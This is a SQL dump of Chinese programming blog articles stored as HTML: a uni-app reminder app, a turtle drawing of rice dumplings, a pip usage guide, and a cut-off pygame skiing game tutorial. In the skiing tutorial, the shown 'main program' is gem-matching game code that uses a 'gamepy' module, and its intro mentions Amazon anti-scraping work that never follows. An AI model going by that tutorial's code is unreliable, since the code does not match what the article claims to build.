punctuation\">,</span> Num_Email<span class=\"token punctuation\">)</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210610233721559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTMwNDUwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"3_uniapp_274\"></a>3. uni-app前端部分</h2> \n <p>前端部分使用的是uni-app，主要是因为这个是跨平台的。<br> 下载HBuilder X 编译器</p> \n <h3><a id=\"31__277\"></a>3.1 登陆页面</h3> \n <p><img src=\"https://img-blog.csdnimg.cn/20210610234222910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTMwNDUwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h3><a id=\"32__281\"></a>3.2 提醒页面</h3> \n <p><img src=\"https://img-blog.csdnimg.cn/20210610234150972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTMwNDUwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h3><a id=\"33__284\"></a>3.3 效果演示</h3> \n <p><img src=\"https://img-blog.csdnimg.cn/20210610234518443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTMwNDUwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>以后我们班成员都能好好看青年大学习了！！！<br> 嘻嘻！！<br> <img src=\"https://img-blog.csdnimg.cn/2021061023462551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTMwNDUwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"4__293\"></a>4. 结语</h2> \n <p>大家不要找我做什么自动看青年大学习了！！<br> <strong>这个不做！！！我不会做！也没必要做！！</strong></p> \n <p>这个只是为了让我们班的同学都能及时完成学习而已，没别的意思。<br> <img src=\"https://img-blog.csdnimg.cn/20210610235953651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTMwNDUwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_301\"></a>最后</h2> \n <p>小生凡一，期待你的关注。</p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 1);
INSERT INTO `t_article` VALUES (78, '端午节，我用 Python 画了一盘粽子送给大家', '<div id=\"content_views\" class=\"markdown_views prism-dracula\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614142825696.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2l0eWFyZA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"\"><br> 今天是端午节，首先祝大家端午安康，说到端午节，粽子则是必不可少的，现在粽子的种类也是五花八门，但我还是喜欢传统的白棕子，你喜欢哪种粽子呢？在大家吃着美味粽子的同时，本文我们画一盘粽子送给大家。</p> \n <h2><a id=\"_3\"></a>先睹为快</h2> \n <p>我们先来欣赏一下最终的效果图：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614142917243.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2l0eWFyZA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"\"></p> \n <p>从图中我们可以看出整体分三部分组成：盘子、粽子、文字，下面我们展开来说一下相应实现。</p> \n <h2><a id=\"_11\"></a>盘子实现</h2> \n <p>首先，我们来画一个盘子，盘子的组成比较简单，就是一个椭圆再加上填充色，代码实现如下：</p> \n <pre><code class=\"prism language-python\"><span class=\"token comment\"># 画盘子</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">plate</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> angle<span class=\"token punctuation\">,</span> steps<span class=\"token punctuation\">,</span> rotateAngle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    minAngle <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>pi <span class=\"token operator\">/</span> <span class=\"token number\">360</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> angle <span class=\"token operator\">/</span> steps\n    rotateAngle <span class=\"token operator\">=</span> rotateAngle <span class=\"token operator\">/</span> <span class=\"token number\">360</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>pi\n    penup<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 起笔</span>\n    setpos<span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>sin<span class=\"token punctuation\">(</span>rotateAngle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span>b <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>cos<span class=\"token punctuation\">(</span>rotateAngle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    pendown<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 落笔</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>steps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        nextPoint <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>a <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>sin<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> minAngle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span>b <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>cos<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> minAngle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n        nextPoint <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>nextPoint<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>cos<span class=\"token punctuation\">(</span>rotateAngle<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> nextPoint<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>sin<span class=\"token punctuation\">(</span>rotateAngle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                     nextPoint<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>sin<span class=\"token punctuation\">(</span>rotateAngle<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> nextPoint<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> math<span class=\"token punctuation\">.</span>cos<span class=\"token punctuation\">(</span>rotateAngle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n        setpos<span class=\"token punctuation\">(</span>nextPoint<span class=\"token punctuation\">)</span>\n</code></pre> \n <p>效果如下：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614142939226.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2l0eWFyZA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"\"></p> \n <h2><a id=\"_34\"></a>粽子实现</h2> \n <p>接着，我们看一下本文最核心的部分-粽子的实现，实现代码如下：</p> \n <pre><code class=\"prism language-python\"><span class=\"token comment\"># 画粽子</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">rice_dumpling</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pensize<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 画笔宽度</span>\n    pencolor<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 画笔颜色</span>\n    fillcolor<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 填充色</span>\n    begin_fill<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 向前</span>\n    circle<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#画圆弧</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n    circle<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n    circle<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n    circle<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n    circle<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">173</span><span class=\"token punctuation\">)</span>\n    circle<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">)</span>\n    end_fill<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    penup<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n    right<span class=\"token punctuation\">(</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span>\n    back<span class=\"token punctuation\">(</span><span class=\"token number\">105</span><span class=\"token punctuation\">)</span>\n    a <span class=\"token operator\">=</span> pos<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pendown<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    color<span class=\"token punctuation\">(</span><span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    fillcolor<span class=\"token punctuation\">(</span><span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\n    begin_fill<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token punctuation\">)</span>\n    goto<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n    penup<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    back<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span>\n    left<span class=\"token punctuation\">(</span><span class=\"token number\">90</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n    right<span class=\"token punctuation\">(</span><span class=\"token number\">90</span><span class=\"token punctuation\">)</span>\n    pendown<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span>\n    right<span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span>\n    right<span class=\"token punctuation\">(</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token punctuation\">)</span>\n    right<span class=\"token punctuation\">(</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span>\n    end_fill<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    begin_fill<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    left<span class=\"token punctuation\">(</span><span class=\"token number\">110</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">65</span><span class=\"token punctuation\">)</span>\n    left<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span>\n    left<span class=\"token punctuation\">(</span><span class=\"token number\">80</span><span class=\"token punctuation\">)</span>\n    fd<span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span>\n    end_fill<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>效果如下：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614142955197.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2l0eWFyZA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"\"></p> \n <h2><a id=\"_97\"></a>文字实现</h2> \n <p>我们再接着看一下如何添加文字，比如我要添加的文字是：祝大家端午安康，添加文字实现很容易，只需一行代码即可，代码实现如下：</p> \n <pre><code class=\"prism language-python\">write<span class=\"token punctuation\">(</span><span class=\"token string\">\"祝大家端午安康\"</span><span class=\"token punctuation\">,</span> move<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> align<span class=\"token operator\">=</span><span class=\"token string\">\"center\"</span><span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Comic Sans\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"bold\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>文中全部代码已经为大家整理好了，有需要的在公众号<strong>Python小二</strong>后台回复<strong>端午</strong>即可获取。</p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 1);
INSERT INTO `t_article` VALUES (79, '一分钟学会Python中pip的安装与使用', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"toc\"> \n  <h3>文章目录</h3> \n  <ul>\n   <li><a href=\"#_1\">一、简单介绍</a></li>\n   <li><a href=\"#_4\">二、下载安装</a></li>\n   <li><a href=\"#_13\">三、最常用命令</a></li>\n   <li>\n    <ul>\n     <li><a href=\"#1_14\">1、显示版本和路径</a></li>\n     <li><a href=\"#2_18\">2、获取帮助</a></li>\n     <li><a href=\"#3_pip_21\">3、升级 pip</a></li>\n     <li><a href=\"#4_29\">4、安装包</a></li>\n     <li><a href=\"#5_36\">5、升级包</a></li>\n     <li><a href=\"#6_42\">6、卸载包</a></li>\n     <li><a href=\"#7_44\">7、搜索包</a></li>\n     <li><a href=\"#8_46\">8、显示安装包信息</a></li>\n     <li><a href=\"#9_49\">9、列出已安装的包</a></li>\n     <li><a href=\"#10_52\">10、查看指定包的详细信息</a></li>\n    </ul> </li>\n  </ul> \n </div> \n <p></p> \n <h1><a id=\"_1\"></a>一、简单介绍</h1> \n <p>pip 是 Python 包管理工具，该工具提供了对Python 包的查找、下载、安装和卸载的功能，现在大家用到的所有包不是自带的就是通过pip安装的。Python 2.7.9 + 或 Python 3.4+ 以上版本都自带 pip 工具。给出pip官网链接：<a href=\"https://pypi.org/project/pip/\">pip官网</a>。<br> <img src=\"https://img-blog.csdnimg.cn/20210613195354960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjU3NjY2,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h1><a id=\"_4\"></a>二、下载安装</h1> \n <p>可以通过命令 pip --version 来判断是否已安装：<br> <img src=\"https://img-blog.csdnimg.cn/20210613195734694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjU3NjY2,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 如果你还未安装，则可以使用以下方法来安装：</p> \n <pre><code class=\"prism language-kotlin\">$ curl https<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>bootstrap<span class=\"token punctuation\">.</span>pypa<span class=\"token punctuation\">.</span>io<span class=\"token operator\">/</span><span class=\"token keyword\">get</span><span class=\"token operator\">-</span>pip<span class=\"token punctuation\">.</span>py <span class=\"token operator\">-</span>o <span class=\"token keyword\">get</span><span class=\"token operator\">-</span>pip<span class=\"token punctuation\">.</span>py   # 下载安装脚本\n$ sudo python <span class=\"token keyword\">get</span><span class=\"token operator\">-</span>pip<span class=\"token punctuation\">.</span>py    # 运行安装脚本\n</code></pre> \n <h1><a id=\"_13\"></a>三、最常用命令</h1> \n <h2><a id=\"1_14\"></a>1、显示版本和路径</h2> \n <p><strong><font color=\"blue\">pip --version</font></strong><br> <img src=\"https://img-blog.csdnimg.cn/20210613200557990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjU3NjY2,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"2_18\"></a>2、获取帮助</h2> \n <p><strong><font color=\"blue\">pip --help</font></strong><br> <img src=\"https://img-blog.csdnimg.cn/20210613200856170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjU3NjY2,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"3_pip_21\"></a>3、升级 pip</h2> \n <p><strong><font color=\"blue\">pip install -U pip</font></strong></p> \n <pre><code class=\"prism language-java\">ps<span class=\"token operator\">:</span>升级需谨慎，经常看到pip提醒升级，然后输入命令回车，系统开始下载最新版安装包，\n准备安装前卸载了旧版pip，然后新版又报错无法安装，只好又重装。\n</code></pre> \n <h2><a id=\"4_29\"></a>4、安装包</h2> \n <p><strong><font color=\"blue\">pip install SomePackage # 最新版本</font></strong><br> pip install SomePackage==1.0.4 # 指定版本<br> pip install ‘SomePackage&gt;=1.0.4’ # 最小版本</p> \n <p>比如我要安装sklearn，输入pip install sklearn，就会安装最新版本的包<br> <img src=\"https://img-blog.csdnimg.cn/20210613222747396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjU3NjY2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"5_36\"></a>5、升级包</h2> \n <p><strong><font color=\"blue\">pip install --upgrade SomePackage</font></strong></p> \n <pre><code class=\"prism language-java\">升级指定的包，通过使用<span class=\"token operator\">==</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&gt;=</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;=</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;</span> 来指定一个版本号。\n</code></pre> \n <h2><a id=\"6_42\"></a>6、卸载包</h2> \n <p><strong><font color=\"blue\">pip uninstall SomePackage</font></strong></p> \n <h2><a id=\"7_44\"></a>7、搜索包</h2> \n <p><strong><font color=\"blue\">pip search SomePackage</font></strong></p> \n <h2><a id=\"8_46\"></a>8、显示安装包信息</h2> \n <p><strong><font color=\"blue\">pip show SomePackage</font></strong><br> <img src=\"https://img-blog.csdnimg.cn/20210613223627472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjU3NjY2,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"9_49\"></a>9、列出已安装的包</h2> \n <p><strong><font color=\"blue\">pip list</font></strong><br> <img src=\"https://img-blog.csdnimg.cn/20210613223746674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjU3NjY2,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"10_52\"></a>10、查看指定包的详细信息</h2> \n <p><strong><font color=\"blue\">pip show -f SomePackage</font></strong><br> <img src=\"https://img-blog.csdnimg.cn/20210613224027463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjU3NjY2,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <blockquote> \n  <p>在和一位粉丝的对话中知道她问过很多公众号和博主，但只有我一个人回了她并且帮助了她。还发了一大段话感谢我，我也礼貌地回复了她，她还特别提到好不容易找到我的博客，而且还是免费开源的。免费分享资源、免费帮助别人一直是我的初衷，我不在意别人是否收费，或是付费专栏或是收费资源之类的，总之我做好自己的，每个人都在自己的领域中发光发热！</p> \n </blockquote> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (80, 'Python开发一个滑雪小游戏', '<div id=\"content_views\" class=\"htmledit_views\"> \n <blockquote> \n  <p>大家好，我是Lex 喜欢欺负超人那个Lex</p> \n  <p>擅长领域：Python开发一个小游戏</p> \n  <p>今日重点：一步步分析and越过亚马逊的反爬虫机制</p> \n </blockquote> \n <h3>&nbsp;不一会，游戏写好了</h3> \n <p>效果是这样的</p> \n <p><img alt=\"\" height=\"652\" src=\"https://img-blog.csdnimg.cn/20210418135122258.gif\" width=\"634\"></p> \n <h3></h3> \n <h3>一、如何搭建开发环境环境</h3> \n <p><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115682970\">一起来学pygame吧 游戏开发30例（开篇词）——环境搭建+游戏效果展示</a></p> \n <blockquote> \n  <p>windows系统，python3.6+&nbsp; pip21+</p> \n </blockquote> \n <pre><code class=\"language-bash\">安装游戏依赖模块\n\npip install pygame</code></pre> \n <h3>二、完整开发流程</h3> \n <h3 id=\"%E9%A1%B9%E7%9B%AE%E4%B8%BB%E7%BB%93%E6%9E%84\">1、代码结构</h3> \n <p>首先，先整理一下项目的主结构，其实看一下主结构，基本就清晰了</p> \n <pre><code class=\"language-css\">modules：自己定义的模块\n——game.py:主程序\n\nres：存放引用到的图片和音频等等\n——music: 音频 资源\n——imgs: 图片 资源\n——fonts： 字体\n\ncfg.py：为主配置文件\n\nskiing.py：主程序文件\n\nrequirements.txt：需要引入的python依赖包</code></pre> \n <p><img alt=\"\" height=\"393\" src=\"https://img-blog.csdnimg.cn/20210617204935310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"469\"></p> \n <h3></h3> \n <h3 id=\"%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6\">2、详细配置</h3> \n <p><strong>cfg.py</strong></p> \n <p>配置文件中，需要引入os模块，并且配置打开游戏的屏幕大小。将我们需要用到的图片、音频和字体文件全部引入到项目中。</p> \n <pre><code class=\"language-python\">\'\'\'配置文件\'\'\'\nimport os\n\n\n\'\'\'FPS\'\'\'\nFPS = 40\n\'\'\'游戏屏幕大小\'\'\'\nSCREENSIZE = (640, 640)\n\'\'\'图片路径\'\'\'\nSKIER_IMAGE_PATHS = [\n    os.path.join(os.getcwd(), \'res/imgs/game_forward.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_right1.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_right2.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_left2.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_left1.png\'),\n    os.path.join(os.getcwd(), \'res/imgs/game_fall.png\')\n]\nOBSTACLE_PATHS = {\n    \'tree\': os.path.join(os.getcwd(), \'res/imgs/tree.png\'),\n    \'flag\': os.path.join(os.getcwd(), \'res/imgs/flag.png\')\n}\n\'\'\'背景音乐路径\'\'\'\nBGMPATH = os.path.join(os.getcwd(), \'res/music/bgm.mp3\')\n\'\'\'字体路径\'\'\'\nFONTPATH = os.path.join(os.getcwd(), \'res/font/FZSTK.TTF\')</code></pre> \n <h3></h3> \n <h3 id=\"%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E8%BF%B7%E5%AE%AB%E5%9C%B0%E5%9B%BE\">3、动画中引用到的图片</h3> \n <p><img alt=\"\" height=\"326\" src=\"https://img-blog.csdnimg.cn/20210418144944794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"538\"></p> \n <p></p> \n <h3 id=\"5%E3%80%81%E8%B5%84%E6%BA%90%E7%9B%B8%E5%85%B3\">4、资源文件</h3> \n <p>包括游戏背景音频、图片和字体设计</p> \n <p><strong>res</strong></p> \n <p>music：游戏背景音乐</p> \n <p>fonts：记分牌呀、显示呀的 相关字体</p> \n <p>imgs：游戏动画里的静态图片，所谓动画都是图片</p> \n <p></p> \n <h3 id=\"6%E3%80%81%E5%90%AF%E5%8A%A8%E4%B8%BB%E7%A8%8B%E5%BA%8F\">5、主程序</h3> \n <p><strong>skiing.py</strong></p> \n <p>在主程序中，通过读取配置文件，引入项目资源：包括图片、音频等，并从我们的modules里引入所有我们的模块。</p> \n <pre><code class=\"language-python\">\'\'\' 类\'\'\'\nclass lexGame():\n    def __init__(self, screen, sounds, font, lex_imgs, cfg, **kwargs):\n        self.info = \'Gemlex —— hacklex\'\n        self.screen = screen\n        self.sounds = sounds\n        self.font = font\n        self.lex_imgs = lex_imgs\n        self.cfg = cfg\n        self.reset()\n    \'\'\'开始 \'\'\'\n    def start(self):\n        clock = gamepy.time.Clock()\n        # 遍历整个 界面更新位置\n        overall_moving = True\n        # 指定某些对象个体更新位置\n        individual_moving = False\n        # 定义一些必要的变量\n        lex_selected_xy = None\n        lex_selected_xy2 = None\n        swap_again = False\n        add_score = 0\n        add_score_showtimes = 10\n        time_pre = int(time.time())\n        #  主循环\n        while True:\n            for event in gamepy.event.get():\n                if event.type == gamepy.QUIT or (event.type == gamepy.KEYUP and event.key == gamepy.K_ESCAPE):\n                    gamepy.quit()\n                    sys.exit()\n                elif event.type == gamepy.MOUSEBUTTONUP:\n                    if (not overall_moving) and (not individual_moving) and (not add_score):\n                        position = gamepy.mouse.get_pos()\n                        if lex_selected_xy is None:\n                            lex_selected_xy = self.checkSelected(position)\n                        else:\n                            lex_selected_xy2 = self.checkSelected(position)\n                            if lex_selected_xy2:\n    